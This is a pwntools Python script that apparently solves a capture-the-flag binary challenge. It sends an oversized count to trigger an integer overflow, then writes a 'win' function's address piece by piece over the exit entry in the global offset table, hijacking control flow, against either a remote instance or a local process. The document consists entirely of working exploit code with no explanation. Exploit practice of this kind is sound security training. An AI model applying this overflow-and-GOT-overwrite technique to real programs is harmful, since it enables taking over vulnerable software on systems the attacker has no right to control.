from pwn import *
from config import REMOTE_HOSTNAME, REMOTE_PORT

REMOTE = 1 # Change to 1 to run the exploit on the remote instance

e = context.binary = ELF("./chal")

if REMOTE:
    p = remote(REMOTE_HOSTNAME, REMOTE_PORT)
else:
    p = e.process()

io = r = p # use whichever you like for communication

def create_numbers(num_numbers):
    p.sendlineafter(b"How many numbers? ", str(num_numbers).encode())

def add_number(idx, value, another):
    p.sendlineafter(b"Which idx to set? ", str(idx).encode())
    p.sendlineafter(b"Value to set? ", str(value).encode())
    if another:
        choice = "y"
    else:
        choice = "n"
    
    p.sendlineafter(b"Another? ", choice)


exit_idx = e.got.exit // 2

create_numbers(0xffffffffffffffff // 2)

for i in range(4):
    if i == 3:
        add_number(exit_idx + i, (e.sym.win >> (16*i)) & 0xffff, False)
    else:
        add_number(exit_idx + i, (e.sym.win >> (16*i)) & 0xffff, True)

print(p.recvall().decode())



